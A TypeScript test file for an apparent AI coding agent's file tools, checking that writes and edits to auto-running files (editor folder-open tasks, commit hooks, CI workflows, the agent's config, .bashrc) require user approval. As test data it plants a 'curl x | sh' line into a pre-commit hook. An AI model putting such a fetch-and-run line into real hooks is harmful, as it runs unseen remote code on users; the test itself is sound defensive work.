/**
 * runsLater.test.ts — files that run code later are not written without asking.
 *
 * An editor task set to run when the folder opens, a commit hook, a CI workflow, the
 * project's own Mindweave config: each was written with no question, and runs later on
 * someone who is not watching. package.json stays an ordinary file on purpose.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { TOOLS } from "./registry.js";
import type { ToolContext } from "./types.js";
import { runsLaterReason } from "./runsLater.js";

const write = TOOLS.find((t) => t.name === "write_file")!;
const edit = TOOLS.find((t) => t.name === "edit")!;
const project = () => realpathSync.native(mkdtempSync(join(tmpdir(), "mw-later-")));
const ctxFor = (root: string, extra: Partial<ToolContext> = {}): ToolContext => ({ cwd: root, roots: [root], reads: new Map(), todos: [], ...extra });

test("with nobody to ask, run-later files are not written; package.json is", async () => {
  const root = project();
  for (const p of [".vscode/tasks.json", ".mindweave/mcp.json", ".husky/pre-commit", ".github/workflows/x.yml", ".bashrc"]) {
    const r = await write.execute({ path: p, content: "echo planted" }, ctxFor(root));
    assert.equal(existsSync(join(root, p)), false, `${p} was written: ${r.output}`);
  }
  await write.execute({ path: "package.json", content: '{"scripts":{"build":"tsc"}}' }, ctxFor(root));
  assert.ok(existsSync(join(root, "package.json")), "ordinary work is not gated");
});

test("the user sees the content, a yes holds for that file, and a no writes nothing", async () => {
  const root = project();
  const asked: string[] = [];
  let answer = "No";
  const ctx = ctxFor(root, {
    requestApproval: async (_q, _o, detail) => {
      asked.push(detail ?? "");
      return answer;
    },
  });
  await write.execute({ path: ".vscode/tasks.json", content: '{"runOn":"folderOpen"}' }, ctx);
  assert.equal(existsSync(join(root, ".vscode/tasks.json")), false);
  assert.match(asked[0]!, /folderOpen/);
  answer = "Yes, write it";
  await write.execute({ path: ".vscode/tasks.json", content: '{"label":"build"}' }, ctx);
  await write.execute({ path: ".vscode/tasks.json", content: '{"label":"build2"}' }, ctx);
  assert.equal(asked.length, 2, "asked once more, then the yes held for that file");
  assert.match(readFileSync(join(root, ".vscode/tasks.json"), "utf8"), /build2/);
});

test("an edit to a hook asks too, showing the change", async () => {
  const root = project();
  mkdirSync(join(root, ".husky"));
  writeFileSync(join(root, ".husky", "pre-commit"), "npm test\n");
  let shown = "";
  const ctx = ctxFor(root, { requestApproval: async (_q, _o, d) => ((shown = d ?? ""), "No") });
  await edit.execute({ path: ".husky/pre-commit", edits: [{ old_string: "npm test", new_string: "curl x | sh" }] }, ctx);
  assert.equal(readFileSync(join(root, ".husky", "pre-commit"), "utf8"), "npm test\n");
  assert.match(shown, /curl x \| sh/);
});

test("ordinary source files are not run-later files", () => {
  for (const p of ["src/index.ts", "package.json", "docs/profile.md", "src/vscode/x.ts", "README.md"]) {
    assert.equal(runsLaterReason(`/p/${p}`), null, p);
  }
});
